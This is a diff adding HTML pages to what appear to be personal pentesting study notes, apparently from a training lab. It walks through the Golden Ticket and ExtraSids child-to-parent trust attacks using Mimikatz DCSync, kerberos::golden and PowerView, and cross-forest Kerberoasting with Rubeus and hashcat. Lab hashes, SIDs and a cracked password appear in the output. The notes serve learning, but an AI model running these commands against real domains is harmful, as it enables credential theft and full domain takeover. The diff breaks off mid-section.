@@ -16407,6 +16407,15 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#the-golden-ticket-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Golden Ticket attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#kerberos-double-hop-problem" class="md-nav__link">
     <span class="md-ellipsis">
       Kerberos "Double Hop" Problem
@@ -17311,6 +17320,15 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#the-golden-ticket-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Golden Ticket attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#kerberos-double-hop-problem" class="md-nav__link">
     <span class="md-ellipsis">
       Kerberos "Double Hop" Problem
@@ -17695,6 +17713,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="kerberos-constrained-delegation-pending">❗ Kerberos Constrained Delegation [PENDING]</h3>
 <h3 id="kerberos-unconstrained-delegation-pending">❗ Kerberos Unconstrained Delegation [PENDING]</h3>
 <h3 id="kerberos-resource-based-constrained-delegation-rbcd-pending">❗ Kerberos Resource-Based Constrained Delegation (RBCD) [PENDING]</h3>
+<h3 id="the-golden-ticket-attack">The Golden Ticket attack</h3>
+<p><strong>The attack in a nugshell:</strong> First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments.  The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account.</p>
 <h3 id="kerberos-double-hop-problem">Kerberos "Double Hop" Problem</h3>
 <p><strong>Kerberos "Double Hop" Problem</strong>: The "Double Hop" problem often occurs when using WinRM/Powershell or Evil-WinRM, since the default authentication mechanism only provides a ticket to access a specific resource (winrm). When we use Kerberos to establish a remote session, we are not using a password for authentication, and the user's ticket-granting service (TGS) ticket is sent to the remote service, but the TGT ticket is not sent. Therefore, when we try to authenticate over a second resource, the machine can not pull any hash from memory or generate any TGS to authenticate us.</p>
 <p>In a nutshell, <strong>Kerberos "Double Hop" Problem</strong> arises when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second, as the user's password  was never cached as part of their login.  In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.</p>
@@ -18559,17 +18579,305 @@ This repository provides a few techniques and scripts regarding the impact of Mi
 <li>The Exchange group <code>Organization Management</code> is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called <code>Microsoft Exchange Security Groups</code>, which contains the group <code>Exchange Windows Permissions</code>.</li>
 </ul>
 <p>If we can compromise an Exchange server, this will often lead to Domain Admin privileges. </p>
+<h2 id="attacking-domain-trusts-1-child-parent-trusts">👀 Attacking Domain Trusts # 1: Child -&gt; Parent Trusts</h2>
+<h3 id="extrasids-attack-mimikatz">ExtraSids Attack - Mimikatz</h3>
+<p>The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.</p>
+<p>The attack explained in a nugshell:</p>
+<ul>
+<li>Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control.</li>
+<li>When logging in with this account, all of the SIDs associated with the account are added to the user's token.</li>
+<li>If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a <a href="https://attack.mitre.org/techniques/T1558/001/">Golden Ticket</a> or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.</li>
+</ul>
+<h4 id="introduction-to-sid-history-and-sid-filtering">Introduction to SID History and SID Filtering</h4>
+<p><a href="https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html">SID Filtering</a> prevents such abuse by verifying and blocking unauthorized or suspicious SIDs during authentication across a trust.</p>
+<blockquote>
+<p><strong>SID History</strong> exists specifically to allow migrated users to access resources in the original domain. Enabling SID Filtering disrupts this functionality by ignoring SID history during authentication across trust boundaries. This trade-off arises because:</p>
+<ol>
+<li>
+<p><strong>Functionality Comes with Risk:</strong><br />
+    Allowing SID history in a trust scenario opens the door for <strong>privilege escalation attacks</strong> through SID injection.</p>
+</li>
+<li>
+<p><strong>SID History is Not Always Needed:</strong></p>
+</li>
+<li>
+<p>In many migration scenarios, users may no longer need access to the original domain once migration is complete. In such cases, the risks of allowing SID history outweigh the benefits.</p>
+</li>
+<li>
+<p>SID Filtering is particularly useful in inter-forest or external trust scenarios where one environment does not fully trust the security practices of the other.</p>
+</li>
+<li>
+<p><strong>Balancing Security and Usability:</strong><br />
+   Organizations must evaluate their specific requirements. If SID history functionality is crucial, <strong>SID Filtering can be disabled selectively</strong> for specific trusts while mitigating risks through other means (e.g., enhanced monitoring or strict trust policies).</p>
+</li>
+</ol>
+<p><strong>Why SID Filtering is Still Useful</strong></p>
+<p>While SID Filtering blocks the main functionality of SID history, its purpose is not to disable SID history entirely but to <strong>control where and when SID history can be used</strong>:</p>
+<ul>
+<li>
+<p><strong>Within the Same Forest:</strong><br />
+  SID Filtering is typically not applied to intra-forest authentication because all domains in a forest share the same schema and security boundary. SID History works seamlessly here.<br />
+ Example: Users migrating between domains in the same forest (<code>DomainA.local</code> to <code>DomainB.local</code>) can use SID history without interference.</p>
+</li>
+<li>
+<p><strong>Between Different Forests:</strong><br />
+    Trusts between forests (or external domains) are high-risk. SID Filtering ensures that only valid SIDs from the trusted forest or domain are honored, blocking any unauthorized or injected SIDs.</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="the-attack">The attack</h4>
+<p>To perform this attack after compromising a child domain, we need the following:</p>
+<ul>
+<li>The KRBTGT hash for the child domain</li>
+<li>The SID for the child domain</li>
+<li>The name of a target user in the child domain (does not need to exist!)</li>
+<li>The FQDN of the child domain.</li>
+<li>The SID of the Enterprise Admins group of the root domain.</li>
+<li>With this data collected, the attack can be performed with Mimikatz.</li>
+</ul>
+<h5 id="step-1-getting-the-krbtgt-hash-from-the-child-domain">Step 1: getting the KRBTGT hash from the child domain</h5>
+<p>First, we need to obtain the NT hash for the <a href="https://adsecurity.org/?p=483">KRBTGT</a> account, which is a service account for the Key Distribution Center (KDC) in Active Directory.</p>
+<p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-71-1">1</a></span>
+<span class="normal"><a href="#__codelineno-71-2">2</a></span>
+<span class="normal"><a href="#__codelineno-71-3">3</a></span>
+<span class="normal"><a href="#__codelineno-71-4">4</a></span>
+<span class="normal"><a href="#__codelineno-71-5">5</a></span>
+<span class="normal"><a href="#__codelineno-71-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1"></a># Go to mimikatz.exe file in the explorer and execute as admin
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2"></a>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3"></a>lsadump::dcsync /user:$domain\$user
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4"></a># Example:
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5"></a># .\mimikatz.exe
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6"></a># lsadump::dcsync /user:LOGISTICS\krbtgt
+</span></code></pre></div></td></tr></table></div>
+<p>Results:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-72-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-72-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-72-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-72-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-72-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-72-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-72-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-72-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-72-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-72-10">10</a></span>
+<span class="normal"><a href="#__codelineno-72-11">11</a></span>
+<span class="normal"><a href="#__codelineno-72-12">12</a></span>
+<span class="normal"><a href="#__codelineno-72-13">13</a></span>
+<span class="normal"><a href="#__codelineno-72-14">14</a></span>
+<span class="normal"><a href="#__codelineno-72-15">15</a></span>
+<span class="normal"><a href="#__codelineno-72-16">16</a></span>
+<span class="normal"><a href="#__codelineno-72-17">17</a></span>
+<span class="normal"><a href="#__codelineno-72-18">18</a></span>
+<span class="normal"><a href="#__codelineno-72-19">19</a></span>
+<span class="normal"><a href="#__codelineno-72-20">20</a></span>
+<span class="normal"><a href="#__codelineno-72-21">21</a></span>
+<span class="normal"><a href="#__codelineno-72-22">22</a></span>
+<span class="normal"><a href="#__codelineno-72-23">23</a></span>
+<span class="normal"><a href="#__codelineno-72-24">24</a></span>
+<span class="normal"><a href="#__codelineno-72-25">25</a></span>
+<span class="normal"><a href="#__codelineno-72-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1"></a>[DC] &#39;LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the domain
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2"></a>[DC] &#39;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the DC server
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3"></a>[DC] &#39;LOGISTICS\krbtgt&#39; will be the user account
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4"></a>[rpc] Service  : ldap
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5"></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6"></a>
+</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7"></a>Object RDN           : krbtgt
+</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8"></a>
+</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9"></a>** SAM ACCOUNT **
+</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10"></a>
+</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11"></a>SAM Username         : krbtgt
+</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12"></a>Account Type         : 30000000 ( USER_OBJECT )
+</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13"></a>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14"></a>Account expiration   :
+</span><span id="__span-72-15"><a id="__codelineno-72-15" name="__codelineno-72-15"></a>Password last change : 11/1/2021 10:21:33 AM
+</span><span id="__span-72-16"><a id="__codelineno-72-16" name="__codelineno-72-16"></a>Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
+</span><span id="__span-72-17"><a id="__codelineno-72-17" name="__codelineno-72-17"></a>Object Relative ID   : 502
+</span><span id="__span-72-18"><a id="__codelineno-72-18" name="__codelineno-72-18"></a>
+</span><span id="__span-72-19"><a id="__codelineno-72-19" name="__codelineno-72-19"></a>Credentials:
+</span><span id="__span-72-20"><a id="__codelineno-72-20" name="__codelineno-72-20"></a>  Hash NTLM: 9d765b482771505cbe97411065964d5f
+</span><span id="__span-72-21"><a id="__codelineno-72-21" name="__codelineno-72-21"></a>    ntlm- 0: 9d765b482771505cbe97411065964d5f
+</span><span id="__span-72-22"><a id="__codelineno-72-22" name="__codelineno-72-22"></a>    lm  - 0: 69df324191d4a80f0ed100c10f20561e
+</span><span id="__span-72-23"><a id="__codelineno-72-23" name="__codelineno-72-23"></a>
+</span><span id="__span-72-24"><a id="__codelineno-72-24" name="__codelineno-72-24"></a>Supplemental Credentials:
+</span><span id="__span-72-25"><a id="__codelineno-72-25" name="__codelineno-72-25"></a>
+</span><span id="__span-72-26"><a id="__codelineno-72-26" name="__codelineno-72-26"></a>SNIP
+</span></code></pre></div></td></tr></table></div>
+<p>KRBTGT hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h5 id="step-2-getting-the-sid-for-the-child-domain">Step 2: getting the SID for the child domain</h5>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-73-1">1</a></span>
+<span class="normal"><a href="#__codelineno-73-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2"></a><span class="nb">Get-DomainSID</span>
+</span></code></pre></div></td></tr></table></div>
+<p>However it was also visible in the Mimikatz output above.</p>
+<h5 id="step-3-getting-the-name-of-a-target-user-in-the-child-domain-does-not-need-to-exist">Step 3: getting the name of a target user in the child domain (does not need to exist!)</h5>
+<p>For instance, <code>hacker</code>.</p>
+<h5 id="step-4-getting-the-fqdn-of-the-child-domain">Step 4: getting the FQDN of the child domain.</h5>
+<p>It was also visible in the Mimikatz output above: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<h5 id="step-5-getting-the-sid-of-the-enterprise-admins-group-of-the-root-domain">Step 5: getting the SID of the Enterprise Admins group of the root domain</h5>
+<p>Next, we can use <code>Get-DomainGroup</code> from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. </p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-74-1">1</a></span>
+<span class="normal"><a href="#__codelineno-74-2">2</a></span>
+<span class="normal"><a href="#__codelineno-74-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="nv">$domain</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">objectsid</span>
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2"></a><span class="c"># Example: </span>
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3"></a><span class="c"># Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We could also do this with the <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-75-1">1</a></span>
+<span class="normal"><a href="#__codelineno-75-2">2</a></span>
+<span class="normal"><a href="#__codelineno-75-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1"></a><span class="nb">Get-ADGroup</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="n">-Server</span> <span class="s2">&quot;$DomainServer&quot;</span><span class="p">`</span>
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2"></a><span class="c"># Example: </span>
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3"></a><span class="c"># Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server &quot;INLANEFREIGHT.LOCAL&quot;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Results:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-76-1">1</a></span>
+<span class="normal"><a href="#__codelineno-76-2">2</a></span>
+<span class="normal"><a href="#__codelineno-76-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1"></a>distinguishedname                                       objectsid
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2"></a>-----------------                                       ---------
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3"></a>CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+</span></code></pre></div></td></tr></table></div>
+<h5 id="step-6-the-attack">Step 6: The attack</h5>
+<ul>
+<li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code></li>
+<li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code></li>
+<li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: <code>hacker</code></li>
+<li>The FQDN of the child domain: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li>
+<li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
+</ul>
+<p>Before the attack, we can confirm no access to the file system of the DC in the parent domain:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-77-1">1</a></span>
+<span class="normal"><a href="#__codelineno-77-2">2</a></span>
+<span class="normal"><a href="#__codelineno-77-3">3</a></span>
+<span class="normal"><a href="#__codelineno-77-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1"></a><span class="c"># List C: in the parent domain:</span>
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3"></a><span class="c"># Example: </span>
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-78-1">1</a></span>
+<span class="normal"><a href="#__codelineno-78-2">2</a></span>
+<span class="normal"><a href="#__codelineno-78-3">3</a></span>
+<span class="normal"><a href="#__codelineno-78-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$madeupUserName</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$targetedFQDN</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="nv">$sidTargetedDomain</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="nv">$NTLMhashOfKRBTGTaccountDomain</span>  <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="nv">$SIDofEnterpriseAdminGroup</span> <span class="p">/</span><span class="n">ptt</span>
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2"></a>
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3"></a><span class="c"># Example:</span>
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4"></a><span class="c"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Now, let's list the kerberos tickets in memory:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-79-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1"></a><span class="n">klist</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Now we can perform actions in the parent domain, such as reading a flag:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-80-1">1</a></span>
+<span class="normal"><a href="#__codelineno-80-2">2</a></span>
+<span class="normal"><a href="#__codelineno-80-3">3</a></span>
+<span class="normal"><a href="#__codelineno-80-4">4</a></span>
+<span class="normal"><a href="#__codelineno-80-5">5</a></span>
+<span class="normal"><a href="#__codelineno-80-6">6</a></span>
+<span class="normal"><a href="#__codelineno-80-7">7</a></span>
+<span class="normal"><a href="#__codelineno-80-8">8</a></span>
+<span class="normal"><a href="#__codelineno-80-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1"></a><span class="c"># List C: in the parent domain:</span>
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3"></a><span class="c"># Example: </span>
+</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
+</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5"></a>
+</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6"></a><span class="c"># Read the flag</span>
+</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7"></a><span class="nb">cat </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="nv">$path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-80-8"><a id="__codelineno-80-8" name="__codelineno-80-8"></a><span class="c"># Example: </span>
+</span><span id="__span-80-9"><a id="__codelineno-80-9" name="__codelineno-80-9"></a><span class="c"># cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="cross-forest-kerberoasting">Cross-Forest Kerberoasting</h3>
+<p>Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p>
+<h4 id="enumerating-spns">Enumerating SPNs</h4>
+<p>Enumerating Accounts for Associated SPNs Using Get-DomainUser:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-81-1">1</a></span>
+<span class="normal"><a href="#__codelineno-81-2">2</a></span>
+<span class="normal"><a href="#__codelineno-81-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SamAccountName</span>
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2"></a><span class="c"># Example:</span>
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3"></a><span class="c"># Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Results:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-82-1">1</a></span>
+<span class="normal"><a href="#__codelineno-82-2">2</a></span>
+<span class="normal"><a href="#__codelineno-82-3">3</a></span>
+<span class="normal"><a href="#__codelineno-82-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1"></a>samaccountname
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2"></a>--------------
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3"></a>krbtgt
+</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4"></a>mssqlsvc
+</span></code></pre></div></td></tr></table></div>
+<p>There is one account with an SPN in the target domain. </p>
+<h4 id="getting-which-groups-is-spm-member-of">Getting which groups is SPM member of</h4>
+<p>A quick check shows that this account is a member of the Domain Admins group in the target domain.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-83-1">1</a></span>
+<span class="normal"><a href="#__codelineno-83-2">2</a></span>
+<span class="normal"><a href="#__codelineno-83-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Domain</span> <span class="nv">$TargetDomain</span> <span class="n">-Identity</span> <span class="nv">$interestingUserSamAccountName</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">memberof</span>
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2"></a><span class="c"># Example:</span>
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3"></a><span class="c"># Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag">Performing a Kerberoasting Attacking with Rubeus Using /domain Flag</h4>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-84-1">1</a></span>
+<span class="normal"><a href="#__codelineno-84-2">2</a></span>
+<span class="normal"><a href="#__codelineno-84-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="nv">$TargetDomain</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$interestingUserSamAccountName</span> <span class="p">/</span><span class="n">nowrap</span>
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2"></a><span class="c"># Example: </span>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3"></a><span class="c"># .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span>
+</span></code></pre></div></td></tr></table></div>
+<p>When getting the kerberos ticket, we can crack it: </p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-85-1">1</a></span>
+<span class="normal"><a href="#__codelineno-85-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1"></a><span class="go">hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt </span>
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2"></a><span class="gp"># </span>Results:<span class="w"> </span>1logistics
+</span></code></pre></div></td></tr></table></div>
+<h3 id="admin-password-re-use-group-membership">Admin Password Re-Use &amp; Group Membership</h3>
+<p>From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.</p>
+<h4 id="using-get-domainforeigngroupmember">Using Get-DomainForeignGroupMember</h4>
+<p>For instance,  the <code>FREIGHTLOGISTICS.LOCAL</code> domain with which we have an external bidirectional forest trust.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-86-1">1</a></span>
